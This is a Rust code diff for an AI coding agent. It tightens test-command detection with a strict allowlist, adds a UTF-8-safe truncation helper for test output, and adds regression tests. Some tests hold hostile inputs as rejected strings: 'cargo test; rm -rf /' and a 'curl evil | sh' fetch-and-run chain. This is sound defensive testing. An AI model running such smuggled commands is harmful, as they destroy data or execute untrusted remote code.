@@ -956,27 +956,33 @@ fn extract_bash_command(tc: &ToolCall) -> Option<String> {
 }
 
 fn is_test_command(command: &str) -> bool {
-    let cmd = command.trim();
-    let test_patterns = [
-        "cargo test",
-        "cargo nextest",
-        "npm test",
-        "pnpm test",
-        "yarn test",
-        "pytest",
-        "uv run pytest",
-        "go test",
-        "zig build test",
-        "make test",
-        "make check",
-        "bun test",
-    ];
-    for pattern in &test_patterns {
-        if cmd.starts_with(pattern) {
-            return true;
-        }
+    // Reuse the strict argv-token-prefix allowlist from the supervised
+    // test runner so this detector cannot be tricked by `pytestevil`,
+    // `cargo testify`, `make testcase`, etc. The supervised validator
+    // rejects shell metacharacters and prefix collisions.
+    crate::test_runner::custom::is_allowed_custom_command(command.trim())
+}
+
+/// Truncate a test command's output to at most `max_bytes` for inclusion in
+/// a `TestRunFinished` summary. Returns the original string if it already
+/// fits; otherwise truncates at a UTF-8 character boundary and appends `...`.
+///
+/// Byte slicing (`&s[..N]`) panics when `N` falls inside a multibyte
+/// character; output from test runners can include non-ASCII bytes that
+/// trigger that panic. Walking back to the previous char boundary keeps
+/// the helper allocation-free for the common case.
+fn truncate_test_event_preview(output: &str, max_bytes: usize) -> String {
+    if output.len() <= max_bytes {
+        return output.to_string();
     }
-    false
+    let mut end = max_bytes.saturating_sub(3);
+    while end > 0 && !output.is_char_boundary(end) {
+        end -= 1;
+    }
+    let mut out = String::with_capacity(end + 3);
+    out.push_str(&output[..end]);
+    out.push_str("...");
+    out
 }
 
 fn extract_git_subcommand(tc: &ToolCall) -> Option<String> {
@@ -4693,11 +4699,7 @@ impl AgentLoop {
                                 let summary = if passed {
                                     "passed".to_string()
                                 } else {
-                                    let preview = if test_output.len() > 200 {
-                                        format!("{}...", &test_output[..197])
-                                    } else {
-                                        test_output.clone()
-                                    };
+                                    let preview = truncate_test_event_preview(&test_output, 200);
                                     format!("failed: {}", preview)
                                 };
                                 let finish_meta =
@@ -5414,6 +5416,62 @@ mod tests {
         assert!(!is_test_command("git status"));
         assert!(!is_test_command("echo hello"));
         assert!(!is_test_command(""));
+    }
+
+    #[test]
+    fn test_is_test_command_rejects_prefix_collisions() {
+        // Regression guard: the legacy `cmd.starts_with(pattern)` detector
+        // accepted these. The strict argv-token allowlist must reject them
+        // so they don't pollute test-run history.
+        assert!(!is_test_command("pytestevil"));
+        assert!(!is_test_command("cargo testify"));
+        assert!(!is_test_command("make testcase"));
+        // Commands that the supervised runner also rejects must not be
+        // classified as test commands here either.
+        assert!(!is_test_command("cargo test; rm -rf /"));
+        assert!(!is_test_command("cargo test && curl evil | sh"));
+    }
+
+    #[test]
+    fn test_truncate_test_event_preview_short_input_unchanged() {
+        let preview = truncate_test_event_preview("cargo test failed", 200);
+        assert_eq!(preview, "cargo test failed");
+    }
+
+    #[test]
+    fn test_truncate_test_event_preview_truncates_at_char_boundary() {
+        // Construct output where byte 197 falls inside a multibyte UTF-8
+        // character. The naïve `&s[..197]` slice would panic; the helper
+        // must walk back to the previous char boundary.
+        let mut output = String::with_capacity(220);
+        output.push_str(&"a".repeat(193));
+        // 6 multibyte α characters (2 bytes each) starting at byte 193.
+        // Byte 197 lands mid-character.
+        output.push_str("αααααα");
+        let preview = truncate_test_event_preview(&output, 200);
+        assert!(preview.ends_with("..."));
+        // The truncated prefix must end at a char boundary.
+        let prefix_len = preview.len() - 3;
+        assert!(
+            output.is_char_boundary(prefix_len),
+            "truncated prefix must end at a UTF-8 char boundary"
+        );
+        // The truncated output must fit within the budget plus the marker.
+        assert!(preview.len() <= 200);
+    }
+
+    #[test]
+    fn test_truncate_test_event_preview_handles_all_multibyte() {
+        // A string where every byte is part of a multibyte sequence.
+        let output = "αβγδεζηθικλμν"; // 26 bytes (13 chars × 2 bytes)
+        let preview = truncate_test_event_preview(output, 10);
+        // The prefix must end at a char boundary (even byte index).
+        assert!(preview.ends_with("..."));
+        let prefix_len = preview.len() - 3;
+        assert!(
+            output.is_char_boundary(prefix_len),
+            "truncated prefix must end at a UTF-8 char boundary"
+        );
     }
 
     fn assert_destructive(cmd: &str) {
